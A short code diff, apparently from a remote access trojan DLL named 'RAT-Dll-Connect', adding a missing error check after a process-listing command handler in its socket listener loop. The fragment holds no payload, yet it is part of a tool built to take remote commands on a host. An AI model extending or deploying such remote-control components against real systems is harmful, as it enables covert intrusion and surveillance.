@@ -192,6 +192,7 @@ INT startListen()
             else if (strcmp((const char*)&recvBuf, PROCESSLIST) == 0)
             {
                 status = handleProcessList(clientSock);
+                if (status != SUCCESS)
                 {
                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleProcessList %d\n", status);
                     OutputDebugStringA(msgBuf);
